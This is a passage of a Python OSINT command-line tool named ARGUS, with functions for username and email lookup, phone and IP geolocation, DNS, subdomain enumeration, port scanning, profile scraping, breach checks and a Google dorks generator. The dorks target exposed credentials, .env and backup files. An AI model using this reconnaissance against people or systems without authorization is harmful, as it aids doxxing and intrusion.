    "About.me": "https://about.me/{}",
    "SlideShare": "https://www.slideshare.net/{}",
    "Replit": "https://replit.com/@{}",
    "Linktree": "https://linktr.ee/{}",
    "YouTube": "https://www.youtube.com/@{}",
}


def check_platform(platform, url, session):
    try:
        resp = session.get(url, timeout=8, allow_redirects=True)
        if resp.status_code == 200:
            return platform, url, True
    except Exception:
        pass
    return platform, url, False


def username_search():
    print_header("Username Search")
    username = prompt("Username")
    if not username:
        return

    spinner("Searching platforms...", 1.0)
    found = 0
    with requests.Session() as session:
        session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS OSINT Tool)"})
        futures = {}
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            for platform, url_tpl in PLATFORMS.items():
                url = url_tpl.format(username)
                futures[pool.submit(check_platform, platform, url, session)] = platform
            for future in concurrent.futures.as_completed(futures):
                platform, url, exists = future.result()
                if exists:
                    print_ok(f"{platform:<16} {G}{url}{RST}")
                    found += 1
                else:
                    print_err(f"{platform:<16} Not found")

    print(f"\n  {Y}Results: {G}{found}{Y}/{len(PLATFORMS)} platforms{RST}")


# ─── 2. Email Lookup ──────────────────────────────────────────────────────────

def email_lookup():
    print_header("Email Lookup")
    email = prompt("Email address")
    if not email:
        return

    pattern = r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$"
    if not re.match(pattern, email):
        print_err("Invalid email format")
        return

    spinner("Analyzing email...", 0.8)
    local, domain = email.split("@")
    print_row("Local Part", local)
    print_row("Domain", domain)
    print_row("Provider", domain.split(".")[0].title())

    # Gravatar check
    email_hash = hashlib.md5(email.lower().strip().encode()).hexdigest()
    gravatar_url = f"https://www.gravatar.com/avatar/{email_hash}?d=404"
    try:
        resp = requests.get(gravatar_url, timeout=5)
        if resp.status_code == 200:
            print_ok(f"Gravatar found: https://www.gravatar.com/avatar/{email_hash}")
        else:
            print_warn("No Gravatar profile")
    except Exception:
        print_warn("Could not check Gravatar")

    # MX record
    if dns:
        try:
            answers = dns.resolver.resolve(domain, "MX")
            for rdata in answers:
                print_row("Mail Server", str(rdata.exchange).rstrip("."))
        except Exception:
            print_warn("Could not resolve MX records")
    else:
        print_warn("dnspython not installed — skipping MX lookup")


# ─── 3. Phone Number Lookup ───────────────────────────────────────────────────

_NUMBER_TYPE_NAMES = {
    0: "Fixed line",
    1: "Mobile",
    2: "Fixed line or mobile",
    3: "Toll free",
    4: "Premium rate",
    5: "Shared cost",
    6: "VoIP",
    7: "Personal number",
    8: "Pager",
    9: "UAN",
    10: "Voicemail",
    27: "Emergency",
    28: "Short code",
    29: "Standard rate",
    99: "Unknown",
}

_COUNTRY_PREFIXES = {
    "+1": "United States / Canada", "+7": "Russia / Kazakhstan",
    "+20": "Egypt", "+27": "South Africa", "+30": "Greece",
    "+31": "Netherlands", "+32": "Belgium", "+33": "France",
    "+34": "Spain", "+36": "Hungary", "+39": "Italy",
    "+40": "Romania", "+41": "Switzerland", "+43": "Austria",
    "+44": "United Kingdom", "+45": "Denmark", "+46": "Sweden",
    "+47": "Norway", "+48": "Poland", "+49": "Germany",
    "+51": "Peru", "+52": "Mexico", "+53": "Cuba",
    "+54": "Argentina", "+55": "Brazil", "+56": "Chile",
    "+57": "Colombia", "+58": "Venezuela",
    "+60": "Malaysia", "+61": "Australia", "+62": "Indonesia",
    "+63": "Philippines", "+64": "New Zealand", "+65": "Singapore",
    "+66": "Thailand", "+81": "Japan", "+82": "South Korea",
    "+84": "Vietnam", "+86": "China", "+90": "Turkey",
    "+91": "India", "+92": "Pakistan", "+93": "Afghanistan",
    "+94": "Sri Lanka", "+95": "Myanmar",
    "+212": "Morocco", "+213": "Algeria", "+216": "Tunisia",
    "+218": "Libya", "+220": "Gambia", "+221": "Senegal",
    "+234": "Nigeria", "+254": "Kenya", "+255": "Tanzania",
    "+256": "Uganda", "+260": "Zambia", "+263": "Zimbabwe",
    "+351": "Portugal", "+352": "Luxembourg", "+353": "Ireland",
    "+354": "Iceland", "+355": "Albania", "+358": "Finland",
    "+370": "Lithuania", "+371": "Latvia", "+372": "Estonia",
    "+380": "Ukraine", "+381": "Serbia", "+385": "Croatia",
    "+386": "Slovenia", "+420": "Czech Republic", "+421": "Slovakia",
    "+852": "Hong Kong", "+853": "Macau", "+855": "Cambodia",
    "+880": "Bangladesh", "+886": "Taiwan",
    "+960": "Maldives", "+961": "Lebanon", "+962": "Jordan",
    "+963": "Syria", "+964": "Iraq", "+965": "Kuwait",
    "+966": "Saudi Arabia", "+967": "Yemen", "+968": "Oman",
    "+971": "United Arab Emirates", "+972": "Israel", "+973": "Bahrain",
    "+974": "Qatar", "+975": "Bhutan", "+976": "Mongolia",
    "+977": "Nepal", "+992": "Tajikistan", "+993": "Turkmenistan",
    "+994": "Azerbaijan", "+995": "Georgia", "+998": "Uzbekistan",
}


def phone_lookup():
    print_header("Phone Number Lookup")
    phone = prompt("Phone number (with country code, e.g. +39 320 1234567)")
    if not phone:
        return

    spinner("Analyzing phone number...", 0.8)

    # --- Primary: phonenumbers library (offline, comprehensive) ---
    if phonenumbers is not None:
        try:
            parsed = phonenumbers.parse(phone, None)
        except phonenumbers.NumberParseException:
            # Retry assuming Italian number if no country code
            try:
                parsed = phonenumbers.parse(phone, "IT")
            except phonenumbers.NumberParseException as e:
                print_err(f"Cannot parse number: {e}")
                pause()
                return

        valid = phonenumbers.is_valid_number(parsed)
        possible = phonenumbers.is_possible_number(parsed)
        international = phonenumbers.format_number(
            parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        national = phonenumbers.format_number(
            parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
        e164 = phonenumbers.format_number(
            parsed, phonenumbers.PhoneNumberFormat.E164)

        country = pn_geocoder.description_for_number(parsed, "en") or "N/A"
        region = phonenumbers.region_code_for_number(parsed) or "N/A"
        carrier_name = pn_carrier.name_for_number(parsed, "en") or "N/A"
        tz_list = pn_timezone.time_zones_for_number(parsed)
        timezones = ", ".join(tz_list) if tz_list else "N/A"
        num_type = phonenumbers.number_type(parsed)
        type_name = _NUMBER_TYPE_NAMES.get(num_type, "Unknown")

        print_row("International", international)
        print_row("National", national)
        print_row("E.164", e164)
        print_row("Valid", f"{G}Yes{RST}" if valid else f"{R}No{RST}")
        print_row("Possible", f"{G}Yes{RST}" if possible else f"{R}No{RST}")
        print_row("Country", f"{country} ({region})")
        print_row("Carrier", carrier_name)
        print_row("Line Type", type_name)
        print_row("Timezone(s)", timezones)
        print_row("Country Code", f"+{parsed.country_code}")
        print_row("National Number", str(parsed.national_number))

        if not valid:
            print_warn("Number did not pass full validation")

    # --- Fallback: prefix-based analysis ---
    else:
        print_warn("'phonenumbers' not installed. Using basic prefix analysis.")
        print_warn("Install for full results: pip install phonenumbers")
        print()
        cleaned = re.sub(r"[^\d+]", "", phone)
        print_row("Cleaned Number", cleaned)
        print_row("Digits", str(len(re.sub(r"\D", "", cleaned))))

        detected = "Unknown"
        for prefix, name in sorted(
            _COUNTRY_PREFIXES.items(), key=lambda x: -len(x[0])
        ):
            if cleaned.startswith(prefix):
                detected = name
                break
        print_row("Country (guess)", detected)

    pause()


# ─── 4. IP Address Lookup ─────────────────────────────────────────────────────

def ip_lookup():
    print_header("IP Address Lookup")
    ip = prompt("IP address")
    if not ip:
        return

    spinner("Querying geolocation...", 0.8)
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=8)
        data = resp.json()
        if data.get("status") == "success":
            print_row("IP", data.get("query", ip))
            print_row("Country", f"{data.get('country', 'N/A')} ({data.get('countryCode', '')})")
            print_row("Region", data.get("regionName", "N/A"))
            print_row("City", data.get("city", "N/A"))
            print_row("ZIP", data.get("zip", "N/A"))
            print_row("Latitude", str(data.get("lat", "N/A")))
            print_row("Longitude", str(data.get("lon", "N/A")))
            print_row("Timezone", data.get("timezone", "N/A"))
            print_row("ISP", data.get("isp", "N/A"))
            print_row("Organization", data.get("org", "N/A"))
            print_row("AS Number", data.get("as", "N/A"))
            print_row("Mobile", str(data.get("mobile", "N/A")))
            print_row("Proxy/VPN", str(data.get("proxy", "N/A")))
            print_row("Hosting", str(data.get("hosting", "N/A")))
        else:
            print_err(f"Lookup failed: {data.get('message', 'Unknown error')}")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 5. WHOIS Lookup ──────────────────────────────────────────────────────────

def whois_lookup():
    print_header("WHOIS Lookup")
    domain = prompt("Domain")
    if not domain:
        return

    if not whois:
        print_err("python-whois not installed. Run: pip install python-whois")
        return

    spinner("Querying WHOIS...", 1.0)
    try:
        w = whois.whois(domain)
        print_row("Domain", w.domain_name if isinstance(w.domain_name, str) else str(w.domain_name))
        print_row("Registrar", str(w.registrar or "N/A"))
        print_row("Creation Date", str(w.creation_date or "N/A"))
        print_row("Expiration Date", str(w.expiration_date or "N/A"))
        print_row("Updated Date", str(w.updated_date or "N/A"))
        print_row("Name Servers", str(w.name_servers or "N/A"))
        print_row("Status", str(w.status or "N/A"))
        print_row("Registrant", str(w.get("name", "N/A")))
        print_row("Org", str(w.get("org", "N/A")))
        print_row("Country", str(w.get("country", "N/A")))
        print_row("DNSSEC", str(w.get("dnssec", "N/A")))
    except Exception as e:
        print_err(f"WHOIS lookup failed: {e}")


# ─── 6. DNS Lookup ────────────────────────────────────────────────────────────

def dns_lookup():
    print_header("DNS Lookup")
    domain = prompt("Domain")
    if not domain:
        return

    if not dns:
        print_err("dnspython not installed. Run: pip install dnspython")
        return

    spinner("Resolving DNS records...", 0.8)
    record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
    for rtype in record_types:
        try:
            answers = dns.resolver.resolve(domain, rtype)
            for rdata in answers:
                print_row(rtype, str(rdata).rstrip("."))
        except dns.resolver.NoAnswer:
            pass
        except dns.resolver.NXDOMAIN:
            print_err(f"Domain {domain} does not exist")
            return
        except Exception:
            pass


# ─── 7. Subdomain Enumeration ─────────────────────────────────────────────────

def subdomain_enum():
    print_header("Subdomain Enumeration (crt.sh)")
    domain = prompt("Domain")
    if not domain:
        return

    spinner("Querying crt.sh for certificates...", 1.5)
    try:
        resp = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=15,
        )
        if resp.status_code != 200:
            print_err("crt.sh returned an error")
            return

        data = resp.json()
        subdomains = set()
        for entry in data:
            name = entry.get("name_value", "")
            for sub in name.split("\n"):
                sub = sub.strip().lower()
                if sub.endswith(domain) and "*" not in sub:
                    subdomains.add(sub)

        if subdomains:
            for i, sub in enumerate(sorted(subdomains), 1):
                print(f"  {C}{i:>4}.{RST} {W}{sub}{RST}")
            print(f"\n  {Y}Total: {G}{len(subdomains)}{Y} subdomains found{RST}")
        else:
            print_warn("No subdomains found")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 8. HTTP Headers Analysis ─────────────────────────────────────────────────

def http_headers():
    print_header("HTTP Headers Analysis")
    url = prompt("URL (e.g. https://example.com)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    spinner("Fetching headers...", 0.8)
    try:
        resp = requests.head(url, timeout=8, allow_redirects=True,
                             headers={"User-Agent": "ARGUS/1.0"})
        print_row("Status Code", str(resp.status_code))
        print_row("Final URL", resp.url)
        print()
        for header, value in resp.headers.items():
            print_row(header, value)

        # Security header checks
        print(f"\n  {Y}Security Header Checks:{RST}")
        security_headers = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy": "CSP",
            "X-Frame-Options": "Clickjacking Protection",
            "X-Content-Type-Options": "MIME Sniffing Protection",
            "X-XSS-Protection": "XSS Filter",
            "Referrer-Policy": "Referrer Policy",
        }
        for hdr, label in security_headers.items():
            if hdr.lower() in [h.lower() for h in resp.headers]:
                print_ok(f"{label}: Present")
            else:
                print_warn(f"{label}: Missing")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 9. Website Technology Detection ──────────────────────────────────────────

def tech_detect():
    print_header("Website Technology Detection")
    url = prompt("URL (e.g. https://example.com)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    spinner("Analyzing website...", 1.2)
    try:
        resp = requests.get(url, timeout=10,
                            headers={"User-Agent": "Mozilla/5.0 (ARGUS OSINT)"})
        headers = resp.headers
        body = resp.text.lower()

        techs = []

        # Server
        server = headers.get("Server", "")
        if server:
            techs.append(("Server", server))
        powered = headers.get("X-Powered-By", "")
        if powered:
            techs.append(("Powered By", powered))

        # Frameworks / CMS
        signatures = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Joomla": ["joomla", "/media/system/js/"],
            "Drupal": ["drupal", "sites/all/", "sites/default/"],
            "React": ["react", "_react", "reactdom", "__next"],
            "Angular": ["ng-version", "angular"],
            "Vue.js": ["vue.js", "vue.min.js", "__vue__"],
            "jQuery": ["jquery"],
            "Bootstrap": ["bootstrap.min.css", "bootstrap.min.js"],
            "Tailwind CSS": ["tailwindcss", "tailwind"],
            "Next.js": ["__next", "_next/static"],
            "Nuxt.js": ["__nuxt", "_nuxt/"],
            "Laravel": ["laravel", "csrf-token"],
            "Django": ["csrfmiddlewaretoken", "django"],
            "Flask": ["flask"],
            "Ruby on Rails": ["rails", "csrf-token", "turbolinks"],
            "Cloudflare": ["cloudflare"],
            "Google Analytics": ["google-analytics.com", "gtag(", "ga("],
            "Google Tag Manager": ["googletagmanager.com"],
            "Shopify": ["shopify", "cdn.shopify.com"],
            "Wix": ["wix.com", "parastorage.com"],
            "Squarespace": ["squarespace"],
        }

        cf_header = headers.get("cf-ray", "") or headers.get("CF-RAY", "")
        if cf_header:
            techs.append(("CDN", "Cloudflare"))

        for tech, patterns in signatures.items():
            for pattern in patterns:
                if pattern in body:
                    techs.append(("Technology", tech))
                    break

        if techs:
            seen = set()
            for category, tech in techs:
                key = f"{category}:{tech}"
                if key not in seen:
                    seen.add(key)
                    print_row(category, tech)
        else:
            print_warn("No technologies detected")

    except Exception as e:
        print_err(f"Error: {e}")


# ─── 10. Port Scanner ─────────────────────────────────────────────────────────

COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 111: "RPCbind", 135: "MSRPC",
    139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
    6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB",
}


def scan_port(host, port, timeout):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return port, result == 0
    except Exception:
        return port, False


def port_scanner():
    print_header("Port Scanner")
    host = prompt("Target host (IP or domain)")
    if not host:
        return

    print_warn("This is an authorized security testing tool.")
    print_warn("Only scan hosts you have permission to scan.")

    spinner("Resolving host...", 0.5)
    try:
        if STEALTH["enabled"] and dns is not None:
            answers = dns.resolver.resolve(host, "A", lifetime=10)
            ip = str(answers[0])
        else:
            ip = socket.gethostbyname(host)
        print_row("Resolved IP", ip)
    except Exception:
        print_err("Could not resolve hostname")
        return

    spinner("Scanning ports...", 0.5)
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as pool:
        futures = {pool.submit(scan_port, ip, port, 1.5): port for port in COMMON_PORTS}
        for future in concurrent.futures.as_completed(futures):
            port, is_open = future.result()
            if is_open:
                service = COMMON_PORTS.get(port, "Unknown")
                open_ports.append((port, service))
                print_ok(f"Port {port:<6} {G}OPEN{RST}    {service}")

    if not open_ports:
        print_warn("No open ports found (common ports only)")
    else:
        print(f"\n  {Y}Open ports: {G}{len(open_ports)}{Y}/{len(COMMON_PORTS)}{RST}")


# ─── 11. Reverse DNS Lookup ───────────────────────────────────────────────────

def reverse_dns():
    print_header("Reverse DNS Lookup")
    ip = prompt("IP address")
    if not ip:
        return

    spinner("Resolving...", 0.5)
    try:
        hostname, aliases, _ = socket.gethostbyaddr(ip)
        print_row("Hostname", hostname)
        if aliases:
            for alias in aliases:
                print_row("Alias", alias)
    except socket.herror:
        print_err("No PTR record found for this IP")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 12. MAC Address Lookup ───────────────────────────────────────────────────

def mac_lookup():
    print_header("MAC Address Lookup")
    mac = prompt("MAC address (e.g. AA:BB:CC:DD:EE:FF)")
    if not mac:
        return

    cleaned = re.sub(r"[^a-fA-F0-9]", "", mac)
    if len(cleaned) != 12:
        print_err("Invalid MAC address format")
        return

    oui = cleaned[:6].upper()
    formatted = ":".join(cleaned[i:i+2].upper() for i in range(0, 12, 2))
    print_row("MAC Address", formatted)
    print_row("OUI Prefix", f"{oui[:2]}:{oui[2:4]}:{oui[4:6]}")

    spinner("Looking up vendor...", 0.8)
    try:
        resp = requests.get(f"https://api.macvendors.com/{formatted}", timeout=8)
        if resp.status_code == 200:
            print_row("Vendor", resp.text.strip())
        else:
            print_warn("Vendor not found")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 13. Email Breach Check ───────────────────────────────────────────────────

def email_breach_check():
    print_header("Email Breach Check")
    email = prompt("Email address")
    if not email:
        return

    spinner("Checking breach databases...", 1.0)

    # Using the free breach directory API
    try:
        resp = requests.get(
            f"https://api.xposedornot.com/v1/check-email/{email}",
            timeout=10,
            headers={"User-Agent": "ARGUS OSINT Tool"},
        )
        if resp.status_code == 200:
            data = resp.json()
            breaches = data.get("breaches", [])
            if breaches:
                print_err(f"Email found in {R}{len(breaches)}{RST} breach(es)!")
                for b in breaches[:20]:
                    if isinstance(b, str):
                        print(f"    {R}•{RST} {b}")
                    elif isinstance(b, dict):
                        print(f"    {R}•{RST} {b.get('name', b)}")
            else:
                print_ok("No breaches found for this email")
        elif resp.status_code == 404:
            print_ok("No breaches found for this email")
        else:
            print_warn("Breach check API returned unexpected status")
            print_warn("Try manually at: https://haveibeenpwned.com/")
    except Exception:
        print_warn("Could not reach breach-check API")
        print_warn("Try manually at: https://haveibeenpwned.com/")


# ─── 14. Metadata Extractor ───────────────────────────────────────────────────

def metadata_extractor():
    print_header("Image Metadata Extractor")
    url = prompt("Image URL")
    if not url:
        return

    if not Image:
        print_err("Pillow not installed. Run: pip install Pillow")
        return

    spinner("Downloading image...", 1.0)
    try:
        resp = requests.get(url, timeout=15, stream=True,
                            headers={"User-Agent": "ARGUS OSINT Tool"})
        if resp.status_code != 200:
            print_err("Could not download image")
            return

        img = Image.open(io.BytesIO(resp.content))
        print_row("Format", img.format or "Unknown")
        print_row("Size", f"{img.size[0]}x{img.size[1]}")
        print_row("Mode", img.mode)

        exif_data = img._getexif()
        if exif_data:
            print(f"\n  {Y}EXIF Data:{RST}")
            for tag_id, value in exif_data.items():
                tag = TAGS.get(tag_id, tag_id)
                if isinstance(value, bytes):
                    value = value.hex()[:40]
                print_row(str(tag), str(value)[:60])
        else:
            print_warn("No EXIF data found in this image")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 15. Social Media Scraper ─────────────────────────────────────────────────

def social_scraper():
    print_header("Social Media Profile Scraper")
    username = prompt("Username")
    if not username:
        return

    if not BeautifulSoup:
        print_err("beautifulsoup4 not installed. Run: pip install beautifulsoup4")
        return

    spinner("Gathering social profiles...", 1.2)
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    })

    profiles = {
        "GitHub": {
            "url": f"https://api.github.com/users/{username}",
            "api": True,
            "fields": ["name", "bio", "public_repos", "followers", "following",
                       "location", "company", "blog", "created_at"],
        },
        "Reddit": {
            "url": f"https://www.reddit.com/user/{username}/about.json",
            "api": True,
            "fields": ["name", "total_karma", "created_utc"],
        },
    }

    for platform, config in profiles.items():
        print(f"\n  {M}── {platform} ──{RST}")
        try:
            resp = session.get(config["url"], timeout=8)
            if resp.status_code == 200:
                data = resp.json()
                if platform == "Reddit":
                    data = data.get("data", data)
                for field in config["fields"]:
                    value = data.get(field, "N/A")
                    if value and value != "N/A":
                        label = field.replace("_", " ").title()
                        print_row(label, str(value))
                print_ok(f"{platform} profile found")
            elif resp.status_code == 404:
                print_warn(f"{platform} profile not found")
            else:
                print_warn(f"{platform} returned status {resp.status_code}")
        except Exception as e:
            print_err(f"{platform} error: {e}")

    # Additional URL checks
    print(f"\n  {M}── Quick Profile Links ──{RST}")
    quick_links = {
        "Twitter/X": f"https://x.com/{username}",
        "Instagram": f"https://www.instagram.com/{username}/",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "LinkedIn": f"https://www.linkedin.com/in/{username}",
        "YouTube": f"https://www.youtube.com/@{username}",
    }
    for platform, url in quick_links.items():
        print_row(platform, url)


# ─── 16. SSL/TLS Certificate Info ─────────────────────────────────────────────

def ssl_cert_info():
    print_header("SSL/TLS Certificate Info")
    host = prompt("Domain (e.g. google.com)")
    if not host:
        return

    import ssl
    import datetime

    spinner("Fetching SSL certificate...", 1.0)
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(8)
            s.connect((host, 443))
            cert = s.getpeercert()

        subject = dict(x[0] for x in cert.get("subject", ()))
        issuer = dict(x[0] for x in cert.get("issuer", ()))

        print_row("Common Name", subject.get("commonName", "N/A"))
        print_row("Organization", subject.get("organizationName", "N/A"))
        print_row("Issuer", issuer.get("organizationName", "N/A"))
        print_row("Issuer CN", issuer.get("commonName", "N/A"))
        print_row("Valid From", cert.get("notBefore", "N/A"))
        print_row("Valid Until", cert.get("notAfter", "N/A"))
        print_row("Serial Number", cert.get("serialNumber", "N/A"))
        print_row("Version", str(cert.get("version", "N/A")))

        # Check expiry
        not_after = cert.get("notAfter", "")
        if not_after:
            exp = datetime.datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
            days_left = (exp - datetime.datetime.utcnow()).days
            if days_left < 0:
                print_err(f"Certificate EXPIRED {abs(days_left)} days ago!")
            elif days_left < 30:
                print_warn(f"Certificate expires in {days_left} days")
            else:
                print_ok(f"Certificate valid for {days_left} more days")

        # SANs
        san = cert.get("subjectAltName", ())
        if san:
            print(f"\n  {Y}Subject Alt Names:{RST}")
            for type_, value in san[:20]:
                print(f"    {C}•{RST} {value}")
            if len(san) > 20:
                print(f"    {Y}... and {len(san) - 20} more{RST}")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 17. Wayback Machine Lookup ──────────────────────────────────────────────

def wayback_lookup():
    print_header("Wayback Machine Lookup")
    url = prompt("URL or domain")
    if not url:
        return

    spinner("Querying Wayback Machine...", 1.2)
    try:
        # Check availability
        resp = requests.get(
            f"https://archive.org/wayback/available?url={url}",
            timeout=10,
        )
        data = resp.json()
        snapshot = data.get("archived_snapshots", {}).get("closest", {})
        if snapshot:
            print_ok("Archived snapshot found!")
            print_row("Archive URL", snapshot.get("url", "N/A"))
            print_row("Timestamp", snapshot.get("timestamp", "N/A"))
            print_row("Status", snapshot.get("status", "N/A"))
        else:
            print_warn("No snapshot available")

        # Get CDX summary (number of captures)
        resp2 = requests.get(
            f"https://web.archive.org/cdx/search/cdx?url={url}&output=json&limit=1&fl=timestamp",
            timeout=10,
        )
        resp3 = requests.get(
            f"https://web.archive.org/cdx/search/cdx?url={url}&output=json&limit=1&fl=timestamp&sort=closest&from=19960101",
            timeout=10,
        )

        # Count total snapshots
        resp_count = requests.get(
            f"https://web.archive.org/cdx/search/cdx?url={url}&output=json&fl=timestamp&collapse=timestamp:6",
            timeout=15,
        )
        if resp_count.status_code == 200:
            try:
                rows = resp_count.json()
                count = len(rows) - 1  # subtract header row
                if count > 0:
                    print_row("Total Snapshots", f"~{count} (monthly unique)")
                    first = rows[1][0] if len(rows) > 1 else "N/A"
                    last = rows[-1][0] if len(rows) > 1 else "N/A"
                    print_row("First Capture", first)
                    print_row("Last Capture", last)
            except (ValueError, IndexError):
                pass

        print(f"\n  {Y}Browse full history:{RST}")
        print(f"  {W}https://web.archive.org/web/*/{url}{RST}")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 18. Robots.txt & Sitemap Analyzer ───────────────────────────────────────

def robots_sitemap():
    print_header("Robots.txt & Sitemap Analyzer")
    domain = prompt("Domain (e.g. example.com)")
    if not domain:
        return
    if not domain.startswith(("http://", "https://")):
        domain = "https://" + domain
    base = domain.rstrip("/")

    spinner("Fetching robots.txt...", 0.8)
    try:
        resp = requests.get(f"{base}/robots.txt", timeout=8,
                            headers={"User-Agent": "ARGUS OSINT Tool"})
        if resp.status_code == 200:
            print_ok("robots.txt found!")
            lines = resp.text.strip().splitlines()
            disallowed = []
            sitemaps = []
            for line in lines:
                stripped = line.strip()
                if stripped.lower().startswith("disallow:"):
                    path = stripped.split(":", 1)[1].strip()
                    if path:
                        disallowed.append(path)
                elif stripped.lower().startswith("sitemap:"):
                    sitemaps.append(stripped.split(":", 1)[1].strip())

            if disallowed:
                print(f"\n  {Y}Disallowed Paths ({len(disallowed)}):{RST}")
                for p in disallowed[:30]:
                    print(f"    {R}•{RST} {p}")
                if len(disallowed) > 30:
                    print(f"    {Y}... and {len(disallowed) - 30} more{RST}")

            if sitemaps:
                print(f"\n  {Y}Sitemaps ({len(sitemaps)}):{RST}")
                for s in sitemaps:
                    print(f"    {G}•{RST} {s}")
        else:
            print_warn(f"robots.txt not found (HTTP {resp.status_code})")
    except Exception as e:
        print_err(f"Error fetching robots.txt: {e}")

    # Try sitemap.xml
    spinner("Fetching sitemap.xml...", 0.8)
    try:
        resp = requests.get(f"{base}/sitemap.xml", timeout=8,
                            headers={"User-Agent": "ARGUS OSINT Tool"})
        if resp.status_code == 200 and "<?xml" in resp.text[:200]:
            print_ok("sitemap.xml found!")
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, "html.parser")
                urls = soup.find_all("loc")
                print_row("URLs in Sitemap", str(len(urls)))
                for u in urls[:15]:
                    print(f"    {C}•{RST} {u.text}")
                if len(urls) > 15:
                    print(f"    {Y}... and {len(urls) - 15} more{RST}")
            else:
                count = resp.text.count("<loc>")
                print_row("URLs (approx)", str(count))
        else:
            print_warn("sitemap.xml not found")
    except Exception as e:
        print_err(f"Error fetching sitemap.xml: {e}")


# ─── 19. Link Extractor ─────────────────────────────────────────────────────

def link_extractor():
    print_header("Link Extractor")
    url = prompt("URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    if not BeautifulSoup:
        print_err("beautifulsoup4 not installed. Run: pip install beautifulsoup4")
        return

    spinner("Extracting links...", 1.0)
    try:
        resp = requests.get(url, timeout=10,
                            headers={"User-Agent": "Mozilla/5.0 (ARGUS OSINT)"})
        soup = BeautifulSoup(resp.text, "html.parser")
        parsed_base = urlparse(url)

        internal = set()
        external = set()
        resources = {"js": set(), "css": set(), "img": set()}

        for tag in soup.find_all("a", href=True):
            href = tag["href"].strip()
            if href.startswith(("#", "mailto:", "tel:", "javascript:")):
                continue
            parsed = urlparse(href)
            if not parsed.netloc or parsed.netloc == parsed_base.netloc:
                internal.add(href)
            else:
                external.add(href)

        for tag in soup.find_all("script", src=True):
            resources["js"].add(tag["src"])
        for tag in soup.find_all("link", rel=True, href=True):
            if "stylesheet" in tag.get("rel", []):
                resources["css"].add(tag["href"])
        for tag in soup.find_all("img", src=True):
            resources["img"].add(tag["src"])

        print(f"\n  {Y}Internal Links ({len(internal)}):{RST}")
        for link in sorted(internal)[:20]:
            print(f"    {G}•{RST} {link}")
        if len(internal) > 20:
            print(f"    {Y}... and {len(internal) - 20} more{RST}")

        print(f"\n  {Y}External Links ({len(external)}):{RST}")
        for link in sorted(external)[:20]:
            print(f"    {C}•{RST} {link}")
        if len(external) > 20:
            print(f"    {Y}... and {len(external) - 20} more{RST}")

        print(f"\n  {Y}Resources:{RST}")
        print_row("JavaScript Files", str(len(resources["js"])))
        print_row("CSS Files", str(len(resources["css"])))
        print_row("Images", str(len(resources["img"])))
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 20. Google Dorks Generator ──────────────────────────────────────────────

def google_dorks():
    print_header("Google Dorks Generator")
    target = prompt("Target domain or keyword")
    if not target:
        return

    spinner("Generating dorks...", 0.5)
    dorks = [
        (f'site:{target}', "All indexed pages"),
        (f'site:{target} filetype:pdf', "PDF documents"),
        (f'site:{target} filetype:doc OR filetype:docx', "Word documents"),
        (f'site:{target} filetype:xls OR filetype:xlsx', "Spreadsheets"),
        (f'site:{target} filetype:sql', "SQL files"),
        (f'site:{target} filetype:log', "Log files"),
        (f'site:{target} filetype:env', "Environment files"),
        (f'site:{target} filetype:xml', "XML files"),
        (f'site:{target} filetype:conf OR filetype:cfg', "Configuration files"),
        (f'site:{target} filetype:bak OR filetype:old', "Backup files"),
        (f'site:{target} inurl:admin', "Admin pages"),
        (f'site:{target} inurl:login', "Login pages"),
        (f'site:{target} inurl:dashboard', "Dashboard pages"),
        (f'site:{target} inurl:api', "API endpoints"),
        (f'site:{target} intitle:"index of"', "Directory listings"),
        (f'site:{target} intext:"password" OR intext:"username"', "Credentials in text"),
        (f'site:{target} ext:php inurl:?', "PHP with parameters"),
        (f'site:{target} inurl:wp-content', "WordPress content"),
        (f'site:{target} inurl:wp-admin', "WordPress admin"),
        (f'"{target}" inurl:pastebin.com', "Pastebin mentions"),
        (f'"{target}" site:github.com', "GitHub mentions"),
        (f'"{target}" site:trello.com', "Trello mentions"),
        (f'site:{target} intext:"@gmail.com" OR intext:"@yahoo.com"', "Email addresses"),
        (f'site:{target} inurl:signup OR inurl:register', "Registration pages"),
        (f'site:{target} -www', "Subdomains (excluding www)"),
    ]

